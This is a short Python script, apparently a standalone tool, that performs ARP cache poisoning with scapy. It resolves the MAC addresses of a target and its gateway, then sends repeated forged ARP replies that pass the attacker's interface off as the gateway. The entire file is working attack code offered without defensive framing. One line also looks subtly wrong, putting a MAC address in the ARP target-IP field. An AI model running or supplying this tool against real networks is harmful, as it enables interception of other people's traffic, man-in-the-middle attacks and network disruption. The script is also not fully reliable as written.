#! /usr/bin/python3
import logging
import sys
import time

from args import argument
from scapy.arch import get_if_hwaddr
from scapy.layers.inet import Ether
from scapy.layers.l2 import ARP
from scapy.sendrecv import srp


class ArpPoising:
    def __init__(self, ip_target: str):
        self.target = ip_target
        self.my_mac = get_if_hwaddr('enp7s0')

    def get_mac(self, target: str = None, target_target: bool = False):
        pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=target)

        if target_target:
            pkt['ARP'].pdst = self.target

        resp, _ = srp(pkt, timeout=1, verbose=False, retry=10)
        for _, r in resp:
            return r.hwsrc

    def poising(self, target_mac: str, gateway_ip: str = '192.168.0.1', loop: int = 10, sleep: int | float = 1.51):
        """Function target arp table poisoning

        Args:
            target_mac (str): target mac for poising arp table
            gateway_ip (str, optional): ip gateway. Defaults to '192.168.0.1'.
            loop (int, optional): number send packet . Defaults to 10.
            sleep (int, optional): time to sleep between each request. Defaults to 1.51.
        """
        
        pkt = Ether(dst=target_mac) / ARP(psrc=gateway_ip,
                                          hwsrc=self.my_mac, op='is-at', pdst=target_mac)
        pkt.show()
        for _ in range(loop):
            time.sleep(sleep)
            srp(pkt, timeout=5, verbose=False)


if __name__ == '__main__':

    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    arg = argument()
    ip_target = arg.target
    ip_gateway = arg.gateway

    poising = ArpPoising(ip_target)
    mac_addr_gateway = poising.get_mac(ip_gateway)
    mac_addr_target = poising.get_mac(target_target=True)

    print(f'Adresse mac target: {mac_addr_target}')
    print(f'Adresse mac gateway: {mac_addr_gateway}')

    poising.poising(mac_addr_target, loop=100)
